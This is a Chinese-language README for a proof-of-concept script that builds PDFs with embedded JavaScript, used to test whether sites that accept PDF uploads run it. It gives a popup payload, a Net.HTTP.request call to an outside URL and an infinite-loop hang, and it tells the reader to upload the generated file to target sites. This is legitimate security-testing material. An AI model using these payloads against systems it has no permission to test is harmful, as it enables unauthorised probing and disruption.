# 生成包含JavaScript代码的PDF文件

PDF文件能够执行部分JavaScript代码。
此脚本允许我们生成带有JavaScript代码PDF文件，以帮助我们检查在打开文件时是否执行了该JavaScript代码。
>但需要注意的是，PDF能够执行的JavaScript代码非常有限，不能和常规XSS相提并论，因为常规XSS能够打到用户cookie，这个并不能。以目前情况看来，PDF XSS只能够弹窗，基本上SRC对于PDF XSS都是忽略为主。

## 使用方法

1. 编辑`poc.js`中的JS代码(需要注意的是仅支持部分代码，并不是所有JS代码都能执行)
2. `pip install pdfrw`
3. 使用POC创建PDF `python poc.py poc.js`
4. 将生成的`result.pdf`上传到可上传的PDF网站系统中，然后访问该PDF

## 可利用代码

可利用的代码请参考: https://opensource.adobe.com/dc-acrobat-sdk-docs/library/jsapiref/JS_API_AcroJS.html

### 弹窗

```js
app.alert("XSS");
```

### 打开URL

```js
var cURL="http://[REDACTED]/";
var params =
{
     cVerb: "GET",
     cURL: cURL
};
Net.HTTP.request(params);
```

### 延迟

```js
while (true) {}
```

## 参考

以上代码基于 https://github.com/osnr/horrifying-pdf-experiments/